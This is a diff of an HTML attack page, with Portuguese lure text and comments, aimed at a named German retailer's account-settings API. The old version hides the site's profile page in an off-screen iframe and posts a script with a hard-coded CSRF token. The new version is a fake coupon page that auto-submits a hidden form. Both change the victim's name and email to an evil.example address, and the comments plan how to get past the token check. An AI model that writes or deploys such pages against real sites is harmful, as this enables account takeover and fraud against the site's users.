@@ -1,36 +1,18 @@
 <!doctype html>
 <html lang="pt">
-<title>Verificar segurança da sua conta Expert</title>
-<body style="text-align:center;padding-top:30vh">
-  <h3>Clique para verificar</h3>
-  <button onclick="go()">Verificar</button>
-
-<iframe id="g" src="https://www.expert.de/shop/mein-expert/persoenliche-daten" style="position:absolute;left:-9999px"></iframe>
-
-<script>
-function go(){
-  const w=document.getElementById('g').contentWindow;
-  w.postMessage(`
-    fetch('/api/neo/frontend/_api/user/changeBasicUserData',{
-      method:'POST',
-      credentials:'include',
-      headers:{
-        'Content-Type':'application/json',
-        'csrf-token':'722402ba-cab2-4fb4-bf4d-b79747753775'
-      },
-      body:JSON.stringify({
-        userData:{
-          firstname:'Pwn',
-          lastname:'ed',
-          email:'injected@evil.example',
-          birthday:-86400000,
-          gender:'FEMALE'
-        }
-      })
-    })
-    .then(r=>alert('HTTP '+r.status));
-  `,'https://www.expert.de');
-}
-</script>
+<title>Confirme para ganhar cupom</title>
+<body>
+  <form id="f" action="https://www.expert.de/api/neo/frontend/_api/user/changeBasicUserData" method="POST" enctype="application/x-www-form-urlencoded">
+    <!-- JSON dentro de um campo único -->
+    <input type="hidden" name="userData" value='{"firstname":"Ana","lastname":"Silvana","email":"victima-pwned@evil.example","birthday":-86400000,"gender":"FEMALE"}'>
+    <!-- CSRF-token vai como header, mas o form NÃO consegue mandar header custom -->
+  </form>
+  <script>
+    /* não podemos mandar o header csrf-token, então teste rápido:
+       1. abra o link
+       2. veja se o servidor aceita SEM token (costuma dar 403)
+       3. se aceitar, vencemos; senão, pula para o plano B abaixo */
+    document.getElementById('f').submit();
+  </script>
 </body>
 </html>
